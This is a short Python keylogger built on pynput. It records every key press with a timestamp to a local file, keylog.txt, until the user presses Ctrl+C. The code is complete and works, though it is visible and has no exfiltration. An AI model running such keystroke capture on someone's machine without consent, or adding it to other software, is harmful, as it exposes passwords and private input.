from pynput import keyboard
import time

log_file = "keylog.txt"

def on_key_press(key):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, "a") as f:
        f.write(f"{timestamp}: {key}\n")

def main():
    print("Press Ctrl+C to stop logging.")
    try:
        with keyboard.Listener(on_press=on_key_press) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\nStopped logging.")

if __name__ == "__main__":
    main()
